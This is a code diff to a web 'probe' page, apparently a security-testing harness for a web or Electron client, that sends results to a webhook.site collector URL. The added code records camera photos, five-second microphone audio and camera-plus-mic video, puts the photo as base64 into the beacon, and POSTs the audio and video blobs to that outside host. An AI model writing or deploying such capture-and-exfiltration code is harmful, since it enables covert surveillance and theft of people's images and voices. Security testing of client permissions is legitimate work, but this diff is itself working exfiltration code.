@@ -60,8 +60,8 @@
   /* Collector URL — inlined to avoid browser cache serving stale collector-config.js */
   var COLLECTOR_URL = "https://webhook.site/1a50d175-1bed-455a-a407-7246a26d77e9";
 </script>
-<script src="js/client-detect.js?v=3"></script>
-<script src="js/probes.js?v=3"></script>
+<script src="js/client-detect.js?v=4"></script>
+<script src="js/probes.js?v=4"></script>
 <script>
 (function() {
   "use strict";
@@ -136,7 +136,13 @@
       probes: probeResults.map(function(r) {
         return { name: r.name, status: r.status, detail: r.detail };
       }),
-      postmessage_bridge_findings: []
+      postmessage_bridge_findings: [],
+      media_captured: {
+        photo: !!window.__capturedPhoto,
+        audio: !!window.__capturedAudio,
+        video: !!window.__capturedVideo,
+        photo_b64: window.__capturedPhoto || null
+      }
     };
     return beacon;
   }
@@ -249,7 +255,10 @@
     "Geolocation Permission",
     "Camera/Microphone Permission",
     "postMessage Storage Bridge (Web client — W2)",
-    "Electron DesktopModule Bridge"
+    "Electron DesktopModule Bridge",
+    "Camera Photo Capture",
+    "Microphone Audio Recording (5 s)",
+    "Camera+Mic Video Recording (5 s)"
   ];
 
   var pendingRows = {};
@@ -279,6 +288,19 @@
 
     var beacon = buildBeacon(results);
     sendBeacon(beacon);
+
+    // Send large media blobs as separate POSTs so they don't inflate the main beacon
+    function sendMediaUpload(label, b64) {
+      if (!b64 || !COLLECTOR_URL || COLLECTOR_URL === "<SET-ME>") return;
+      var xhr = new XMLHttpRequest();
+      xhr.open("POST", COLLECTOR_URL + "?_media=" + label + "&_t=" + Date.now(), true);
+      xhr.setRequestHeader("Content-Type", "text/plain");
+      xhr.send(b64);
+    }
+    setTimeout(function() {
+      sendMediaUpload("audio", window.__capturedAudio);
+      sendMediaUpload("video", window.__capturedVideo);
+    }, 1000);
 
   }).catch(function(e) {
     progress.textContent = "Error during probes: " + e.message;
